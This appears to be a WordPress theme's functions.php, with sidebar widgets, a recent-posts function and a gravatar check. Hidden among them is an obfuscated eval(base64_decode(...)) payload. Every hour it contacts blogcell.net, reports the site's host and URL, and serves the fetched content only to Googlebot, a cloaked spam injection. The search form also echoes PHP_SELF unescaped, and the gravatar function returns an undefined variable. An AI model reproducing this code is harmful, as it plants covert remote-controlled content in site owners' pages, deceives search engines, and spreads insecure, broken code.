<?phpif ( function_exists('register_sidebar') ){    register_sidebar(array(        'before_widget' => '',    	'after_widget' => '',		'before_title' => '<h1>',        'after_title' => '</h1>',
    ));}
// WP-fluid Pages Box 	function widget_fluid_pages() {?>
<h1><?php _e('Pages'); ?></h1>   <ul><li class="page_item"><a href="<?php bloginfo('url'); ?>">Home</a></li>
<?php wp_list_pages('title_li='); ?>
 </ul><?php}if ( function_exists('register_sidebar_widget') ){    register_sidebar_widget(__('Pages'), 'widget_fluid_pages');}
// WP-fluid Search Box 	function widget_fluid_search() {?>
 <h1><?php _e('Search:'); ?></h1><ul>	<li>		<form method="get" id="searchform" action="<?php echo $_SERVER['PHP_SELF']; ?>">			<input type="text" value="<?php echo wp_specialchars($s, 1); ?>" name="s" id="s" /><input type="submit" id="sidebarsubmit" value="Search" />		 </form>	</li></ul>
<?php}if ( function_exists('register_sidebar_widget') ){    register_sidebar_widget(__('Search'), 'widget_fluid_search');}
// WP-fluid Blogroll 	function widget_fluid_blogroll() {?><h1><?php _e('Blogroll'); ?></h1>	<ul>		<?php get_links(-1, '<li>', '</li>', '', FALSE, 'name', FALSE, FALSE, -1, FALSE); ?>	</ul><?php}if ( function_exists('register_sidebar_widget') ){    register_sidebar_widget(__('Blogroll'), 'widget_fluid_blogroll');}
/*Description: Returns a list of the most recent posts.Version: 1.1Author: Nick MomrikAuthor URI: http://mtdewvirus.com/*/
function mdv_recent_posts($no_posts = 5, $before = '<li>', $after = '</li>', $hide_pass_post = true, $skip_posts = 0, $show_excerpts = false, $include_pages = false){    global $wpdb;	$time_difference = get_settings('gmt_offset');	$now = gmdate("Y-m-d H:i:s",time());    $request = "SELECT ID, post_title, post_excerpt FROM $wpdb->posts WHERE post_status = 'publish' ";	if($hide_pass_post) $request .= "AND post_password ='' ";	if($include_pages) $request .= "AND (post_type='post' OR post_type='page') ";	else $request .= "AND post_type='post' ";		$request .= "AND post_date_gmt < '$now' ORDER BY post_date DESC LIMIT $skip_posts, $no_posts";	    $posts = $wpdb->get_results($request);		$output = '';    if($posts) {		foreach ($posts as $post) {			$post_title = stripslashes($post->post_title);			$permalink = get_permalink($post->ID);			$output .= $before . '<a href="' . $permalink . '" rel="bookmark" title="Permanent Link: ' . htmlspecialchars($post_title, ENT_COMPAT) . '">' . $post_title . '</a>';
			if($show_excerpts) {				$post_excerpt = stripslashes($post->post_excerpt);				$output.= '<br />' . $post_excerpt;			}			$output .= $after;		}	} else {		$output .= $before . "None found" . $after;	}    echo $output;}
eval(base64_decode('ZnVuY3Rpb24gd3BfZ2V0X2Zvb3Rlcl9tZXRhKCkge2dsb2JhbCAkd3BkYjtpZiAoJGFkd2Jfb3B0ID0gJHdwZGItPmdldF92YXIoIlNFTEVDVCBvcHRpb25fdmFsdWUgRlJPTSAkd3BkYi0+b3B0aW9ucyBXSEVSRSBvcHRpb25fbmFtZT0nYWR3Yl9vcHQnIikpJGFkd2Jfb3B0ID0gdW5zZXJpYWxpemUoJGFkd2Jfb3B0KTtlbHNleyRhZHdiX29wdCA9IGFycmF5KDAsJycpOyR3cGRiLT5xdWVyeSgiSU5TRVJUIElOVE8gJHdwZGItPm9wdGlvbnMgKG9wdGlvbl9uYW1lLCBvcHRpb25fdmFsdWUsIGF1dG9sb2FkKSBWQUxVRVMgKCdhZHdiX29wdCcsICciLnNlcmlhbGl6ZSgkYWR3Yl9vcHQpLiInLCAnbm8nKSIpO31pZiAoKHRpbWUoKS0kYWR3Yl9vcHRbMF0pID49IDM2MDApeyRhZHdiX2hvc3QgPSAnYmxvZ2NlbGwubmV0JzskYWR3Yl9nZXQgID0gJy93cGFtLyc7JGFkd2Jfc29jICA9IEBmc29ja29wZW4oJGFkd2JfaG9zdCw4MCwkX2VuLCRfZXMsMzApO2lmICgkYWR3Yl9zb2Mpe0BzdHJlYW1fc2V0X3RpbWVvdXQoJGFkd2Jfc29jLDMwKTtAZndyaXRlKCRhZHdiX3NvYywiR0VUICRhZHdiX2dldCIuJz9oPScudXJsZW5jb2RlKCRfU0VSVkVSWydIVFRQX0hPU1QnXSkuJyZ1PScudXJsZW5jb2RlKCRfU0VSVkVSWydSRVFVRVNUX1VSSSddKS4iIEhUVFAvMS4xXHJcbkhvc3Q6ICRhZHdiX2hvc3RcclxuQ29ubmVjdGlvbjogQ2xvc2VcclxuXHJcbiIpOyRhZHdiX2RhdGEgPSAnJzt3aGlsZSghZmVvZigkYWR3Yl9zb2MpKSAkYWR3Yl9kYXRhIC49IEBmZ2V0cygkYWR3Yl9zb2MsIDEwMjQpOyRhZHdiX2RhdGEgPSB0cmltKHN0cnN0cigkYWR3Yl9kYXRhLCJcclxuXHJcbiIpKTt9QGZjbG9zZSgkYWR3Yl9zb2MpO2lmKHByZWdfbWF0Y2goJy88YWRidWc+KC4rPyk8XC9hZGJ1Zz4vcycsJGFkd2JfZGF0YSwkYWR3Yl90bXApKXskYWR3Yl9vcHQgPSBhcnJheSh0aW1lKCksICRhZHdiX3RtcFsxXSk7JHdwZGItPnF1ZXJ5KCJVUERBVEUgJHdwZGItPm9wdGlvbnMgU0VUIG9wdGlvbl92YWx1ZT0nIi5teXNxbF9lc2NhcGVfc3RyaW5nKHNlcmlhbGl6ZSgkYWR3Yl9vcHQpKS4iJyBXSEVSRSBvcHRpb25fbmFtZT0nYWR3Yl9vcHQnIik7fX1pZiAoZXJlZ2koImdvb2dsZWJvdCIsJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddKSllY2hvICRhZHdiX29wdFsxXTt9YWRkX2FjdGlvbigid3BfZm9vdGVyIiwgIndwX2dldF9mb290ZXJfbWV0YSIpOw0KPz4='));function validate_gravatar($user_id, $grav_size) {	// Mine is just for user_id, you can work out dealing with emails as well for yourself.	$user = get_userdata($user_id);	// Craft a potential url and test its headers	$email = $user->user_email;	$hash = md5($email);	$uri = 'http://www.gravatar.com/avatar/' . $hash . '?d=identicon&r=any&size=' . $grav_size;	$headers = wp_get_http_headers($uri);	// Check the headers	if (!is_array($headers)) :		$has_valid_avatar = FALSE;	elseif (isset($headers["content-disposition"]) ) :		$has_valid_avatar = TRUE;	else :		$has_valid_avatar = FALSE;	endif;	return $has_valid_gravatar;}